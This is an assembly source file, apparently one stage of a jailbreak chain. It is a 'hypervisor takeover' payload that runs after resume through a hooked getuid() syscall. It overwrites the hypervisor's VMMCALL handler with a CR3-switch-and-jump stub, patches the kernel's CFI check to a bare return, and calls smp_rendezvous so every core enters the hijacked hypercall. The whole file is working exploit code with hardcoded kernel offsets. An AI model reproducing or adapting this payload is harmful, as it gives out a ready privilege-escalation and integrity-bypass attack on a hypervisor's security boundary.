/*
 * Post-resume hypervisor takeover blob (runs on the BSP in kernel context).
 *
 * Entered after resume via a khook resume_rip redirect installed on
 * SYS_GETUID+0xE. Inputs (set via kh_set_resume_{rdi,rsi,rdx,rax}):
 *   rdi = kernel text base (ktext)
 *   rsi = direct-map base (dmap, i.e. kdldmap(0))
 *   rdx = continue address (SYS_GETUID+0xE+len) -- where we return to let the
 *         getuid() syscall finish, so the payload can keep running
 *   rax = step selector (PL5_TAKEOVER_STAGE):
 *           0 = do nothing, just return (tests the enter/return path)
 *           1 = patch the VMMCALL handler with the CR3-switch stub
 *           2 = 1 + clear the kernel CFI check byte
 *           3 = 2 + smp_rendezvous(...) -> full takeover (never returns)
 *
 * With NPT already disabled by the pre-suspend break_hv payload, dmap addresses
 * HV physical memory.
 *
 * We patch the *VMMCALL-specific* handler (jump-table target 0x62847375), not
 * the general VMEXIT dispatcher entry (0x62846c00): the dispatcher fires for
 * every exit reason and patching it hands the first unrelated exit to
 * shellcode_hv, which then spins for rendezvous peers that never arrive.
 *
 * The rendezvous action is the kernel's own hypercall-4 wrapper
 * (ktext+0xc09e40: `mov eax,4; vmmcall; ret`); RAX != 0x17 avoids the
 * dispatcher's guest-RAX==0x17 fast path we do not patch.
 *
 * All callee-saved GPRs (rbx, rbp, r12-r15) are preserved so the interrupted
 * getuid() syscall resumes ABI-correctly. Caller-saved regs are free to clobber.
 */
    .section .entry_point,"ax",@progbits
    .global takeover
    .type takeover, @function
takeover:
    push %rbx
    push %rbp
    push %r12
    push %r13
    push %r14
    push %r15
    push %rdx                   /* [rsp] = continue address */
    push %rax                   /* [rsp] = step selector   */

    mov  %rdi, %r12             /* r12 = ktext */
    mov  %rsi, %r13             /* r13 = dmap  */
    mov  %rax, %r14             /* r14 = stage */

    test %r14, %r14
    jz   .Lret

    /* stage >= 1: movabs rax,CAVE_HV_PAGING ; mov cr3,rax ;
     *             movabs rax,CAVE_HV_CODE   ; jmp rax   (25 bytes)
     * written to the SVM VMMCALL handler at dmap + 0x62847375. */
    lea  0x62847375(%r13), %rdi
    lea  .Lstub(%rip), %rsi
    mov  $25, %ecx
    cld
    rep  movsb

    cmp  $1, %r14
    jbe  .Lret

    /* Clear the kernel CFI check (ktext+0x44e5d0 -> ret) so the raw
     * function-pointer callbacks pass. */
    movb $0xc3, 0x44e5d0(%r12)

    cmp  $2, %r14
    jbe  .Lret

    /* smp_rendezvous(setup=ret, action=hc4, teardown=ret, arg=0) */
    lea  0x291232(%r12), %rdi          /* bare `ret` */
    lea  0xc09e40(%r12), %rsi          /* mov eax,4; vmmcall; ret */
    lea  0x291232(%r12), %rdx
    xor  %ecx, %ecx
    lea  0xaf94e0(%r12), %rax          /* smp_rendezvous */
    call *%rax
    /* falls through only if the rendezvous did not divert us */

.Lret:
    pop  %rax
    pop  %rdx
    pop  %r15
    pop  %r14
    pop  %r13
    pop  %r12
    pop  %rbp
    pop  %rbx
    jmp  *%rdx

.Lstub:
    .byte 0x48, 0xb8
    .quad 0x0000000100000000            /* movabs rax, CAVE_HV_PAGING */
    .byte 0x0f, 0x22, 0xd8              /* mov cr3, rax */
    .byte 0x48, 0xb8
    .quad 0x0000000100003000           /* movabs rax, CAVE_HV_CODE */
    .byte 0xff, 0xe0                    /* jmp rax */
    .size takeover, .-takeover
